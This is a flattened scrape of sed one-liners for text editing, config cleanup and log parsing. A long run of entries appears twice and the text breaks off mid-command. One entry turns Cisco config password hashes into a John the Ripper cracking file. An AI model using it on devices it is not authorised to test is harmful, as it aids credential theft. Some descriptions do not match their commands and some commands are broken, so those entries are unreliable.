slashes sed \"s:/old/direcory/:/new/directory/:\" <file> delete a particular line by line number in file sed -i 3d ~/.ssh/known_hosts Convert windows text file to linux text document sed 's/.$//' Win-file.txt Reverse DNS lookups sed 's/\\([0-9]*\\)\\.\\([0-9]*\\)\\.\\([0-9]*\\)\\.\\([0-9]*\\).in-addr.arpa domain name pointer\\(.*\\)\\./\\4.\\3.\\2.\\1\\5/' \\ lookups.txt a find and replace within text-based files sed -i 's/http:\\/\\/old\\/new\\///g' index.html Remove superfluous from conf file sed -re '/^#/d ; s/#.*$// ; /^\\s*$/d' to display number of lines in a file without using wc command sed -n \" $ =\" fileName Remove all leading and trailing slashes on each line of a text file sed -e \"s,/\\+ $ ,,\" -e \"s,^/\\+,,\" file.txt Extract all urls from the last firefox sessionstore.js file used. sed -e 's/{\"url\":/\\n&/g' ~/.mozilla/firefox/*/sessionstore.js | cut -d \\\" -f4 prints line numbers sed '/./=' infile | sed '/^/N; s/\\n/ /' Bold matching string without skipping others sed 's/pattern/^[[1m&^[[0m/g' Print line numbers sed = <file> | sed 'N;s/\\n/\\t/' Print just line 4 from a textfile sed '4!d' Remove trailing whitespaces (or tabs) from a text file sed -i 's/[ \\t]\\+$//g' file.txt Remove CR LF from a text file sed -i 's/\\r\\n//' file.txt turn url and link text into a hyperlink sed \"s/\\([a-zA-Z]*\\:\\/\\/[^,]*\\),\\(.*\\)/\\<a href=\\\"\\1\\\"\\>\\2\\<\\/a\\>/\" Convert all tabs in a file to spaces, assuming the tab width is 2 sed -i 's/\\t/ /g' yourfile convert Unix newlines to DOS newlines sed 's/$' \"/`echo \\\\\\r`/\" Print all lines containing the word 'jan' to a new file. sed -n '/jan\\|Jan\\|JAN\\|JAn\\|jAn\\|jAN\\|jaN/p' data.txt > jan-only-data.txt put all lines in comment where de word DEBUG is found sed -i 's/^.*DEBUG.*/#&/' $file Extract a bash function sed -n '/^function h\\(\\)/,/^}/p' script.sh Remove ( color / special / escape / ANSI ) codes, from text, with sed sed \"s,\\x1B\\[[0-9;]*[a-zA-Z],,g\" List your largest installed packages (on Debian/Ubuntu) sed -ne '/^Package: \\(.*\\)/{s//\\1/;h;};/^Installed-Size: \\(.*\\)/{s//\\1/;G;s/\\n/ /;p;}' /var/lib/dpkg/status | sort -rn Delete an hard disk entry in Virtualbox registry sed -i '/Centos/d' VirtualBox.xml count the number of times you match a substring in a larger text file sed ?s/ [ sub_str ] / [ sub_str ] \\n /g? [ text_file ] | wc -l Get rid of multiple spaces/tabs in a text file sed -i \"s/\\s*/ /g;s/\\s* $ //\" input_file list all available disks and disk partitions sed 's/#.*//' /etc/fstab | column -t top 10 commands used sed -e 's/ *$//' ~/.bash_history | sort | uniq -cd | sort -nr | head Display a block of text with AWK sed -n /start_pattern/,/stop_pattern/p file.txt Show a script or config file without comments sed -e '/^[[:blank:]]*#/d; s/[[:blank:]][[:blank:]]*#.*//' -e '/^$/d' -e '/^\\/\\/.*/d' -e '/^\\/\\*/d;/^ \\* /d;/^ \\*\\//d' /a/file/with/comments Print file content in reverse order sed -n '1!G;h;$p' techie.txt Remove blank lines from a file and save output to new file sed '/^$/d' file >newfile delete first X lines of a file sed '1,55d' Get rid of multiple spaces/tabs in a text file sed -i \"s/\\(\\x09\\{1,\\}\\)\\|\\( \\{1,\\}\\)/ /g;s/\\(\\x09\\{1,\\} $ \\)\\|\\( \\{1,\\} $ \\)//g\" brisati.txt empty set of files sed -i -n '/%/p' *.php Remove a line from a file using sed (useful for updating known SSH server keys when they change) sed '${LINE}d' ~/.ssh/known_host run vlc as root sed -i 's/geteuid/getppid/g' /usr/bin/vlc convert DOS newlines to unix newlines sed 's/$//' Backup a file before editing it. sedit () { cp \" $* \" { ,.bk } ; which $EDITOR > /dev/null && $EDITOR \" $* \" || vim \" $* \" ; } optimized sed sed '/foo/ s/foo/foobar/g' <filename> Remove \"#' from configuration files. sed -i -e 's/^#$//g' /path/to/file Remove comments from files sed -e '/^#/d' -e 's/#.*$//' in Remove all HTML tags from a file sed \"s/<[^>]\\+>//g\" file Update zone file Serial numbers sed -i 's/20[0-1][0-9]\\{7\\}/' ` date +%Y%m%d%I ` '/g' *.db Remove a line in a text file. Useful to fix \"ssh host key change\" warnings sed -i 8d ~/.ssh/known_hosts Remove a line from a file using sed (useful for updating known SSH server keys when they change) sed -i '${LINE}d' ~/.ssh/known_host See the 10 programs the most used sed -e \"s/| /\\n/g\" ~/.bash_history | cut -d ' ' -f 1 | sort | uniq -c | sort -nr | head separate (emphasize) digital strings from other text sed 's/[0-9]\\+/ [&] /g' Print all lines between two line numbers sed -n '3,6p' /path/to/file Insert a colon between every two digits sed 's/\\(..\\)/\\1:/g;s/:$//' mac_address_list Regex to remove HTML-Tags from a file sed -e :a -e 's/<[^>]*>//g;/</N;//ba' index.html regex for turning a URL into a real hyperlink (i.e. for posting somewhere that accepts basic html) sed \"s/\\([a-zA-Z]*\\:\\/\\/[^ ]*\\)\\(.*\\)/\\<a href=\\\"\\1\\\"\\>\\1\\<\\/a\\>\\2/\" Shows cpu load in percent sed -e 's/ .*//' -e 's/\\.//' -e 's/^0*//' /proc/loadavg Apply substitution only on the line following a marker sed '/MARKER/{N;s/THIS/THAT/}' Remove color codes (special characters) with sed sed -r \"s/\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]//g Comment out a line in a file sed -i '19375 s/^/#/' file Simplification of \"sed 'your sed stuff here' file > file2 && mv file2 file\" sed -i 'your sed stuff here' file Remove color codes (special characters) with sed sed -r \"s:\\x1B\\[[0-9;]*[mK]::g\" ' Prepend a text to a file. sed -i '1s/^/text to prepend\\n/' file1 Delete line number 10 from file sed -i '10d' <somefile> remove empty lines sed '/^$/d' Convert files from DOS line endings to UNIX line endings sed -i 's/^M//' file remove leading blank lines sed '/./,$!d' Remove color codes (special characters) with sed sed -r \"s/\\x1B\\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g\" Convert Unix newlines to DOS newlines sed 's/$/<ctrl+v><ctrl+m>/' reverse order of file sed '1!G;h;$!d' Remove the first character of each line in a file sed \"s/^.//g\" files Delete Last Line of a File if it is Blank sed '${/^$/d}' file Simple XML tag extract with sed sed -n 's/.*<foo>\\([^<]*\\)<\\/foo>.*/\\1/p' Perform sed substitution on all but the last line of input sed -e \" $ ! s/ $ /,/\" remove empty lines in place with backup sed -e '/^$/d' -i .bak filewithempty.lines Print all the lines between 10 and 20 of a file sed '10,20!d' Efficiently print a line deep in a huge log file sed '1000000!d;q' < massive-log-file.log Extract title from HTML files sed -n 's/.*<title>\\(.*\\)<\\/title>.*/\\1/ip;T;q' file.html grep -v with multiple patterns. sed '/test/{/error\\|critical\\|warning/d}' somefile a find and replace within text-based files, for batch text replacement, not using perl sed -i -e 's/SEARCH_STRING/REPLACE_STRING/g' ` find . -iname 'FILENAME' ` Go to the Nth line of file sed -n 13p /etc/services Add thousand separator with sed, in a file or within pipe sed -e :a -e 's/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta' filename append empty line after every line in file.txt sed G file.txt Efficiently extract lines between markers sed -n '/START/,${/STOP/q;p}' Change the homepage of Firefox sed -i 's|\\(\"browser.startup.homepage\",\\) \"\\(.*\\)\"|\\1 \"http://sliceoflinux.com\"|' .mozilla/firefox/*.default/prefs.js sed edit-in-place using -a option instead of -i option (no tmp file created) sedi (){ case $# in [ 01 ] | [ 3 -9 ]) echo usage: sedi sed-cmds file ;; 2 ) sed -a '' \" $1 \" ';H;$!d;g;' $2 | sed -a '/^$/d;w ' \" $2 \" '' ;; esac ; } Remove a range of lines from a file sed -i <file> -re '<start>,<end>d' Gives you what's between first string and second string included. sed \"s/^ABC/+ABC/\" <file | sed \"s/DEF $ /DEF+/\" | tr \"\\n\" \"~\" | tr \"+\" \"\\n\" | grep \"^ABC\" | tr \"~\" \"\\n\" Remove blank lines sed '/^$/d' Deleting / Ignoring lines from the top of a file sed 1d foo.txt Extract ip addresses with sed sed -n 's/\\([0-9]\\{1,3\\}\\.\\)\\{3\\}[0-9]\\{1,3\\}/\\nip&\\n/gp' ips.txt | grep ip | sed 's/ip//' | sort | uniq remove lines which are longer than 255 sed -n '/^.\\{255\\}/!p' grep -v with multiple patterns. sed -n '/test/{/error\\|critical\\|warning/d;p}' somefile Remove leading zeros in multiple columns with sed sed 's/\\b\\(0*\\)//g' filename output the contents of a file removing any empty lines including lines which contain only spaces or tabs. sed -e '/^[<space><tab>]*$/d' somefile extract all urls from firefox sessionstore sed -e \"s/\\[{/\\n/g\" -e \"s/}, {/\\n/g\" sessionstore.js | grep url | awk -F \",\" '{ print $1 }' | sed -e \"s/url:\\\"\\([^\\\"]*\\)\\\"/\\1/g\" -e \"/^about:blank/d\" > session_urls.txt print contents of file from line 1 until we match regex sed -n '1,/regex/p' filename preprocess code to be posted in comments on this site sed 's/^/$ /' \" $script \" | xclip quick and dirty formatting for HTML code sed -r 's_(/[^>]*?>)_\\1\\n_g' filename.html Do a search-and-replace in a file after making a backup sed -i.bak 's/old/new/g' file Concatenates lines using sed sed -e :a -e '/$/N;s/\\n/ /;ta' <filename> Replace multiple spaces with semicolon sed \"s/\\s\\+/;/g;s/^ //;s/ $ //\" filename.csv Change every instance of OLD to NEW in file FILE sed -i 's/OLD/NEW/g' FILE Convert DOS newlines (CR/LF) to Unix format sed 's/^M$//' input.txt > output.txt Embed next line on the end of current line using sed sed 'X{N;s/\\n//;}' file.txt ( where X is the current line ) remove newlines from specific lines in a file using sed sed -i '/pattern/N; s/\\n//' filename Capitalize the first letter of every word sed \"s/\\b\\(.\\)/\\u\\1/g\" Show a config file without comments sed -e 's/#.*//;/^\\s*$/d' Top 20 commands in your bash history sed -e 's/[;|][[:space:]]*/\\n/g' .bash_history | cut delimiter = ' ' fields = 1 | sort | uniq count | sort numeric-sort reverse | head lines = 20 Update grub menu.lst sed -e '/^$/d' -e '/^#/d' -e '/initrd/ a\\ ' -e 's/hiddenmenu//g' -e '/^timeout/d' -e '/default/ a\\timeout\\t\\t15' -e 's/quiet//g' -e 's/splash/rootdelay=60/g' /boot/grub/menu.lst > /boot/grub/menu.lst.new delete all leading and trailing whitespace from each line in file sed 's/^[ \\t]*//;s/[ \\t]*$//' -i file Remove space and/or tab characters at the end of line sed -i 's/[ \\t]*$//' file delete all trailing whitespace from each line in file sed -i 's/^\\s\\+//' <file> Display email addresses that have been sent to by a postfix server since the last mail log rollover sed -n -e '/postfix\\/smtp\\[.*status=sent/s/^.*to=<\\([^>]*\\).*$/\\1/p' /var/log/mail.log | sort -u Given process ID print its environment variables sed 's/\\o0/\\n/g' /proc/INSERT_PID_HERE/environ Print only the odd lines of a file (GNU sed) sed 2 ~2d Search replace with Ansible style timestamps sed -i. $( date +%F@%T ) 's/^LogLevel warn/LogLevel debug/g' httpd.conf Exclude inserting a table from a sql import sed '/INSERT INTO `unwanted_table`/d' mydb.sql > reduced.sql Getting a domain from url, ex: very nice to get url from squid access.log sed -e \"s/[^/]*\\/\\/\\([^@]*@\\)\\?\\([^:/]*\\).*/\\2/\" Multi line grep using sed and specifying open/close tags sed '/' \"<opening tag>\" '/,/' \"<closing tag>\" '/{/' \"<closing tag>\" '/d;p};d' \"<file>\" SED - Substitute string in next line sed -i.backup '/patter/{n;s/foo/bar/g}' file remove repeated pairs of characters e.g. \"xtxtxtxt\" will become \"xt\" sed -ru 's/(..)\\1{2,}/\\1/g' Delete all empty/blank lines from text file & output to file sed '/^$/d' /tmp/data.txt > /tmp/output.txt Fix subtitle timing (for .sub files) sed -e 's/{/|/' -e 's/}{/|/' -e 's/}/|/' myFile.sub | awk -F \"|\" 'BEGIN {OFS = \"|\"} { $2 = $2 - 600; $3 = $3 - 600; print $0 }' | sed -e 's/^|/{/' -e 's/\\([0-9]\\)|\\([0-9]\\)/\\1}{\\2/' -e 's/|/}/' > MySQL: Slice out a specific table from the output of mysqldump sed -n \"/^ Table structure for table \\`departments\\`/,/^ Table structure for table/p\" Comment out all lines in a file beginning with string sed -i 's/^\\(somestring\\)/#\\1/' somefile.cfg commentate specified line of a file sed -i '<line_no>s/\\(.*\\)/#\\1/' <testfile> Remove multiple spaces sed \"s/^ *//;s/ * $ //;s/ \\{1,\\}/ /g\" filename.txt Simple Comment an entire file sed -i 's/^/#/' FILENAME Convert a Python interactive session to a python script sed 's/^\\([^>.]\\)/#\\1/;s/^>>> //;s/^\\.\\.\\./ /' Add a line from 1 file after every line of another (shuffle files together) sed '/^/R addfile' targetfile > savefile print contents of file from first match of regex to end of file sed -n '/regex/,$p' filename Compute the numeric sum of a file sed i \"+\" file.txt | xargs echo 0 | bc Delete leading whitespace from the start of each line sed 's/^[ \\t]*//' input.txt Delete leading whitespace from the start of each line sed 's/^\\s*//' input.txt Search apache virtual host by pattern sed -n '/^[^#]*<Virtual/{:l N; /<\\/Virtual/!bl;}; /PATTERN/p' vhosts.conf Terminal - Show directories in the PATH, one per line with sed and bash3.X `here string' sed 's/:/\\n/g' <<< $PATH Remove a range of lines from a file sed -i <start>,<end>d <filename> Every Nth line position # (SED) sed -n '1,${p;n;n;}' foo > foo_every3_position1 ; sed -n '2,${p;n;n;}' foo > foo_every3_position2 ; sed -n '3,${p;n;n;}' foo > foo_every3_position3 In-Place search/replace with datestamped backup sed -i. ` date +%Y%m%d ` -e 's/pattern/replace' [ filename ] Replace spaces in a file with hyphens sed -i 's/ /-/g' * Delete the specified line sed -i 8d ~/.ssh/known_hosts Change host name sed -i 's/oldname/newname/' /etc/hosts /etc/hostname Print just line 4 from a textfile sed -n '4{p;q}' Print just line 4 from a textfile sed -n '4p' Cleanup a (source) text file, removing trailing spaces/tabs and multiple consecutive blank lines sed -i -e 's/[ \\t]*$//;/^$/N;/\\n$/D' sourcefiletocleanup Put uppercase letters in curly brackets in a BibTeX database sed '/^\\s*[^@%]/s=\\([A-Z][A-Z]*\\)\\([^}A-Z]\\|},$\\)={\\1}\\2=g' literature.bib > output.bib Prepend a text to a file. sed -i 's/^/ls -l /' output_files.txt Edit Ruby files within the current directory to use Ruby 1.9+ style symbol keys instead of rockets sed -i \"s/:\\([a-zA-Z_]*\\) =>/\\1:/g\" **/*.rb uncomment the lines where the word DEBUG is found sed 's/^#\\(.*DEBUG\\)/\\1/' $FILE Raspberry Pi serial number w/o leading zeros sed '$!d s/.*: 0\\+//' /proc/cpuinfo Remove color codes (special characters) with sed sed -r \"s/(\\x1B|\\033)(\\(B|\\[([0-9]{1,2}(;[0-9]{1,2})?)?[A-Z])//Ig\" urldecoding sed -e 's/%\\([0-9A-F][0-9A-F]\\)/\\\\\\\\\\x\\1/g' | xargs echo -e Remove color codes (special characters) with sed sed -r 's/' $( echo -e \"\\033\" ) '\\[[0-9]{1,2}(;([0-9]{1,2})?)?[mK]//g' Replace words with sed sed /BEGIN/,/END/s/xxx/yyy/g input.txt Rebuild a Delimited File with a Unique Delimiter sed 's/$/uniqueString/' file.old | sed 's/,/\\n/g' | sed ':loop;/^\\\"[^\\\"]*$/N;s/\\n/,/;/[^\\\"]$/t loop' | sed ':loop;N;s/\\n/@/g;/uniqueString$/!b loop;s/uniqueString$//' > file.new delete all trailing whitespace from each line in file sed 's/[ \\t]*$//' < <file> > <file>.out ; mv <file>.out <file> delete all leading and trailing whitespace from each line in file sed 's/^[ \\t]*//;s/[ \\t]*$//' < <file> > <file>.out ; mv <file>.out <file> Remove r (carriage return) in a file sed -i ' s/ \\r //g somefile.txt delete all leading and trailing whitespace from each line in file sed 's/^\\s*//;s/\\s*$//' -i file Puts every word from a file into a new line sed -r 's/[ \\t\\r\\n\\v\\f]+/\\^J/g' INFILE > OUTFILE Change your e-mail address in multiple files sed -i 's/oldname@example.com/newname@example.com/g' ` grep oldname@example.com -rl . ` Delete all lines after the first match sed -n -e '1,/match/p' Extract ip addresses with sed sed -n 's/.*\\(\\(\\(^\\| \\)[0-9]\\{1,3\\}\\.\\)\\{1\\}\\([0-9]\\{1,3\\}\\.\\)\\{2\\}[0-9]\\{1,3\\}\\) .*/\\1/gp' sed replace string in whole files in folder sed -i 's/SearchString/ReplaceString/g' views/*.php bash chop sed 's/.$//' Printout a list of field numbers from a CSV file with headers as first line. sed 's/,/\\n/g;q' file.csv | nl Remove lines that contain a specific pattern( \\(1) from file(\\) 2). sed -i '/myexpression/d' /path/to/file.txt Convert Windows/DOS Text Files to Unix sed -i 's/\\r//' <filename> insert blank lines sed G input.txt | cat -s Removes lines [range] from file sed '1,5d' /path/to/file more than 4 repeated characters to a single character sed -ru 's/(.)\\1{4,}/\\1/g' Convert camelCase to underscores (camel_case) sed -r 's/([a-z]+)([A-Z][a-z]+)/\\1_\\l\\2/g' file.txt Tells which group you DON'T belong to (opposite of command \"groups\") - uses sed sed -e \"/ $USER /d;s/:.*//g\" /etc/group | sed -e :a -e '/$/N;s/\\n/ /;ta' Remove blank lines from a file sed -i.bak '/^[[:space:]]*$/d' file_name Convert ISO8601 dates to milliseconds since epoch sed \"s|\\(2[0-9]\\{3\\}-[01][0-9]-[0-3][0-9]T[01][0-9]:[0-5][0-9]:[0-5][0-9].[0-9]\\{3\\}Z\\)| $( date -d \\1 +%s ) 000|g\" Go to the Nth line of file sed -n '15p' $file MySQL: Slice out a specific database (assumes existence of the USE statement) from mysqldump output sed -n \"/^USE \\`employees\\`/,/^USE \\`/p\" Remove color codes (special characters) with sed sed -r \"s@\\^\\[{1,2}([0-9]{1,2}(;[0-9]{1,2})?(;[0-9])?(m|K){1,2})?@@g\" Only change the first occurrence of the pattern sed -i \"0,/enabled/{s|enabled=0|enabled=1|}\" /etc/yum.repos.d/remi.repo Remove the first line containing 'match' from file sed -i \" $( grep -nm 1 match file | cut -f1 -d: ) d\" file replace deprecated php-function split in php files sed -i s/split \\( /explode \\( / whatever.php File without comments or blank lines. sed 's/^[[:blank:]]*//; s/^#.*//; /^$/d' filename Comment out all lines in a file beginning with string sed -i '/^somestring/ s/^/#/' somefile.cfg Remove color codes (special characters) with sed sed -r \"s/\\x1B\\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g\" Replace strings in files sed -i -e 's/war/peace/g' * pick up 3 lines start at every 5 th line of file.txt sed -n '1~5{N;N;p}' file.txt Regular expression search pattern to remove the Datetime and Name when you paste from skype chat into your text editor sed -i 's/^.*?].*?:\\s//g' skype-chat-log.txt Analyze Apache Web Log Statistics starting on DATE x sed -n '/05\\/Dec\\/2010/,$ p' access.log | goaccess -s -b Duplicate a line in a text file and replace part of the duplicated line sed -i -e '/foo/p' -e 's/foo/barfoo/' file Format a password file for John the Ripper from Cisco configs (Level 5) sed -n 's/[ :]/_/g; s/^\\(.\\{1,\\}\\)_5_\\($1$[$./0-9A-Za-z]\\{27,31\\}\\)_*$/\\1:\\2/p' < cisco-device-config > passwd HTML esacaping with sed sed 's/&/\\&amp;/g; s/</\\&lt;/g; s/>/\\&gt;/g; s/\"/\\&quot;/g; s/' \"'\" '/\\&#39;/g' Parse bookmarks and download youtube files sed 's+href=\"\\([^\"]*\\)\"+\\n\\1\\n+g' bookmarks.html | grep '^http' | clive Remove color codes (special characters) with sed sed -E \"s/\" $'\\E' \"\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]//g\" Extract specific lines from a text file using Stream Editor (sed) sed -n -e 1186 ,1210p A-small-practice.in Insert line(s) at top of file using sed sed -i '1iI am a new line' file.txt Extract XML from an otherwise plain text log file sed -n '/<Tag>/,/<\\/Tag>/p' logfile.log List the CPU model name sed -n 's/^model name[ \\t]*: *//p' /proc/cpuinfo Edit hosts file to remove \"foo.novalocal\" from it where foo is the hostname of a new VM sed -e \"s/^127.0.1.1 $( hostname ) .novalocal/127.0.1.1/g\" /etc/hosts convert html links into plain text with link anchor sed 's!<[Aa] *href*=*\"\\([^\"]*\\)\"*>\\([^<>]*\\)</[Aa]>!\\1,\\2!g' links.html delete first and last line from file sed '1d;$d' filename Remove comments from files sed -i -e '/^#[^!].*/d' -e 's/\\(.*[^!]\\)#.*[^}]/\\1/' <filename> Sort a one-per-line list of email address, weeding out duplicates sed 's/[ \\t]*$//' < emails.txt | tr 'A-Z' 'a-z' | sort | uniq > emails_sorted.txt Create fortune's *.dat file from commandlinefu from saved preferite sed ':a;N;$!ba;s/\\n\\n/\\n%\\n/g' input.txt >output Replace nelines with spaces sed -e :a -e '$!N;s/\\n/ /;ta' Revoke an existing user's group memberships and add another user to those same groups, sed -i.awkbak \"s/\\([:,]\\)oldspiderman/\\1newspiderman/\" /etc/group Uncomment line based on string match sed -e '/4.2.2.2/ s/^;//' -i test.txt to display all characters except second last character from each line of a file sed 's/^\\(.*\\)\\(.\\)\\(.\\)$/\\1\\3/' fileName Convert CSV files to TSV sed 's/,/\\t/g' report.csv > report.tsv Change time format in log, UNIX Timestamp to Human readable sed -r 's/(\\[|])//g' | awk ' { $1=strftime(\"%D %T\",$1); print }' Remove lines ending or trailing slash (/) sed -i 'g/text/d' <filename> Remove last x lines from file using sed sed -n -e :a -i -e '1,5!{P;N;D;};N;ba' /etc/apt/sources.list Remove a range of lines from a file sed -i 6 ,66d <filename> rsnapshot vim edit replaying space tabs sed 's/ \\+ /\\t/g' /usr/local/etc/rsnapshot.conf >/tmp/snap.conf Join lines split with backslash at the end sed -e '/\\\\$/{:0;N;s/\\\\\\n//;t0}' To print a specific line from a file sed -n 5p <file> uncomment the lines where the word DEBUG is found sed '/^#.*DEBUG.*/ s/^#//' $FILE sed : using colons as separators instead of forward slashes sed \"s:/old/direcory/:/new/directory/:\" <file> delete a particular line by line number in file sed -i 3d ~/.ssh/known_hosts put all lines in comment where de word DEBUG is found sed -i 's/^.*DEBUG.*/#&/' $file Extract a bash function sed -n '/^function h\\(\\)/,/^}/p' script.sh Remove ( color / special / escape / ANSI ) codes, from text, with sed sed \"s,\\x1B\\[[0-9;]*[a-zA-Z],,g\" top 10 commands used sed -e 's/ *$//' ~/.bash_history | sort | uniq -cd | sort -nr | head Display a block of text with AWK sed -n /start_pattern/,/stop_pattern/p file.txt Remove comments from files sed -e '/^#/d' -e 's/#.*$//' in Remove all HTML tags from a file sed \"s/<[^>]\\+>//g\" file Update zone file Serial numbers sed -i 's/20[0-1][0-9]\\{7\\}/' ` date +%Y%m%d%I ` '/g' *.db Remove a line in a text file. Useful to fix \"ssh host key change\" warnings sed -i 8d ~/.ssh/known_hosts Remove a line from a file using sed (useful for updating known SSH server keys when they change) sed -i '${LINE}d' ~/.ssh/known_host See the 10 programs the most used sed -e \"s/| /\\n/g\" ~/.bash_history | cut -d ' ' -f 1 | sort | uniq -c | sort -nr | head separate (emphasize) digital strings from other text sed 's/[0-9]\\+/ [&] /g' Print all lines between two line numbers sed -n '3,6p' /path/to/file Insert a colon between every two digits sed 's/\\(..\\)/\\1:/g;s/:$//' mac_address_list Regex to remove HTML-Tags from a file sed -e :a -e 's/<[^>]*>//g;/</N;//ba' index.html regex for turning a URL into a real hyperlink (i.e. for posting somewhere that accepts basic html) sed \"s/\\([a-zA-Z]*\\:\\/\\/[^ ]*\\)\\(.*\\)/\\<a href=\\\"\\1\\\"\\>\\1\\<\\/a\\>\\2/\" Shows cpu load in percent sed -e 's/ .*//' -e 's/\\.//' -e 's/^0*//' /proc/loadavg Apply substitution only on the line following a marker sed '/MARKER/{N;s/THIS/THAT/}' Remove color codes (special characters) with sed sed -r \"s/\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]//g Comment out a line in a file sed -i '19375 s/^/#/' file Simplification of \"sed 'your sed stuff here' file > file2 && mv file2 file\" sed -i 'your sed stuff here' file Remove color codes (special characters) with sed sed -r \"s:\\x1B\\[[0-9;]*[mK]::g\" ' Prepend a text to a file. sed -i '1s/^/text to prepend\\n/' file1 Delete line number 10 from file sed -i '10d' <somefile> remove empty lines sed '/^$/d' Convert files from DOS line endings to UNIX line endings sed -i 's/^M//' file remove leading blank lines sed '/./,$!d' Remove color codes (special characters) with sed sed -r \"s/\\x1B\\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g\" Convert Unix newlines to DOS newlines sed 's/$/<ctrl+v><ctrl+m>/' reverse order of file sed '1!G;h;$!d' Remove the first character of each line in a file sed \"s/^.//g\" files Delete Last Line of a File if it is Blank sed '${/^$/d}' file Simple XML tag extract with sed sed -n 's/.*<foo>\\([^<]*\\)<\\/foo>.*/\\1/p' Perform sed substitution on all but the last line of input sed -e \" $ ! s/ $ /,/\" remove empty lines in place with backup sed -e '/^$/d' -i .bak filewithempty.lines Print all the lines between 10 and 20 of a file sed '10,20!d' Efficiently print a line deep in a huge log file sed '1000000!d;q' < massive-log-file.log Extract title from HTML files sed -n 's/.*<title>\\(.*\\)<\\/title>.*/\\1/ip;T;q' file.html grep -v with multiple patterns. sed '/test/{/error\\|critical\\|warning/d}' somefile a find and replace within text-based files, for batch text replacement, not using perl sed -i -e 's/SEARCH_STRING/REPLACE_STRING/g' ` find . -iname 'FILENAME' ` Go to the Nth line of file sed -n 13p /etc/services Add thousand separator with sed, in a file or within pipe sed -e :a -e 's/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta' filename append empty line after every line in file.txt sed G file.txt Efficiently extract lines between markers sed -n '/START/,${/STOP/q;p}' Change the homepage of Firefox sed -i 's|\\(\"browser.startup.homepage\",\\) \"\\(.*\\)\"|\\1 \"http://sliceoflinux.com\"|' .mozilla/firefox/*.default/prefs.js sed edit-in-place using -a option instead of -i option (no tmp file created) sedi (){ case $# in [ 01 ] | [ 3 -9 ]) echo usage: sedi sed-cmds file ;; 2 ) sed -a '' \" $1 \" ';H;$!d;g;' $2 | sed -a '/^$/d;w ' \" $2 \" '' ;; esac ; } Remove a range of lines from a file sed -i <file> -re '<start>,<end>d' Gives you what's between first string and second string included. sed \"s/^ABC/+ABC/\" <file | sed \"s/DEF $ /DEF+/\" | tr \"\\n\" \"~\" | tr \"+\" \"\\n\" | grep \"^ABC\" | tr \"~\" \"\\n\" Remove blank lines sed '/^$/d' Deleting / Ignoring lines from the top of a file sed 1d foo.txt Extract ip addresses with sed sed -n 's/\\([0-9]\\{1,3\\}\\.\\)\\{3\\}[0-9]\\{1,3\\}/\\nip&\\n/gp' ips.txt | grep ip | sed 's/ip//' | sort | uniq remove lines which are longer than 255 sed -n '/^.\\{255\\}/!p' grep -v with multiple patterns. sed -n '/test/{/error\\|critical\\|warning/d;p}' somefile Remove leading zeros in multiple columns with sed sed 's/\\b\\(0*\\)//g' filename output the contents of a file removing any empty lines including lines which contain only spaces or tabs. sed -e '/^[<space><tab>]*$/d' somefile extract all urls from firefox sessionstore sed -e \"s/\\[{/\\n/g\" -e \"s/}, {/\\n/g\" sessionstore.js | grep url | awk -F \",\" '{ print $1 }' | sed -e \"s/url:\\\"\\([^\\\"]*\\)\\\"/\\1/g\" -e \"/^about:blank/d\" > session_urls.txt print contents of file from line 1 until we match regex sed -n '1,/regex/p' filename preprocess code to be posted in comments on this site sed 's/^/$ /' \" $script \" | xclip quick and dirty formatting for HTML code sed -r 's_(/[^>]*?>)_\\1\\n_g' filename.html Do a search-and-replace in a file after making a backup sed -i.bak 's/old/new/g' file Concatenates lines using sed sed -e :a -e '/$/N;s/\\n/ /;ta' <filename> Replace multiple spaces with semicolon sed \"s/\\s\\+/;/g;s/^ //;s/ $ //\" filename.csv Change every instance of OLD to NEW in file FILE sed -i 's/OLD/NEW/g' FILE Convert DOS newlines (CR/LF) to Unix format sed 's/^M$//' input.txt > output.txt Embed next line on the end of current line using sed sed 'X{N;s/\\n//;}' file.txt ( where X is the current line ) remove newlines from specific lines in a file using sed sed -i '/pattern/N; s/\\n//' filename Capitalize the first letter of every word sed \"s/\\b\\(.\\)/\\u\\1/g\" Show a config file without comments sed -e 's/#.*//;/^\\s*$/d' Top 20 commands in your bash history sed -e 's/[;|][[:space:]]*/\\n/g' .bash_history | cut delimiter = ' ' fields = 1 | sort | uniq count | sort numeric-sort reverse | head lines = 20 Update grub menu.lst sed -e '/^$/d' -e '/^#/d' -e '/initrd/ a\\ ' -e 's/hiddenmenu//g' -e '/^timeout/d' -e '/default/ a\\timeout\\t\\t15' -e 's/quiet//g' -e 's/splash/rootdelay=60/g' /boot/grub/menu.lst > /boot/grub/menu.lst.new delete all leading and trailing whitespace from each line in file sed 's/^[ \\t]*//;s/[ \\t]*$//' -i file Remove space and/or tab characters at the end of line sed -i 's/[ \\t]*$//' file delete all trailing whitespace from each line in file sed -i 's/^\\s\\+//' <file> Display email addresses that have been sent to by a postfix server since the last mail log rollover sed -n -e '/postfix\\/smtp\\[.*status=sent/s/^.*to=<\\([^>]*\\).*$/\\1/p' /var/log/mail.log | sort -u Given process ID print its environment variables sed 's/\\o0/\\n/g' /proc/INSERT_PID_HERE/environ Print only the odd lines of a file (GNU sed) sed 2 ~2d Search replace with Ansible style timestamps sed -i. $( date +%F@%T ) 's/^LogLevel warn/LogLevel debug/g' httpd.conf Exclude inserting a table from a sql import sed '/INSERT INTO `unwanted_table`/d' mydb.sql > reduced.sql Getting a domain from url, ex: very nice to get url from squid access.log sed -e \"s/[^/]*\\/\\/\\([^@]*@\\)\\?\\([^:/]*\\).*/\\2/\" Multi line grep using sed and specifying open/close tags sed '/' \"<opening tag>\" '/,/' \"<closing tag>\" '/{/' \"<closing tag>\" '/d;p};d' \"<file>\" SED - Substitute string in next line sed -i.backup '/patter/{n;s/foo/bar/g}' file remove repeated pairs of characters e.g. \"xtxtxtxt\" will become \"xt\" sed -ru 's/(..)\\1{2,}/\\1/g' Delete all empty/blank lines from text file & output to file sed '/^$/d' /tmp/data.txt > /tmp/output.txt Fix subtitle timing (for .sub files) sed -e 's/{/|/' -e 's/}{/|/' -e 's/}/|/' myFile.sub | awk -F \"|\" 'BEGIN {OFS = 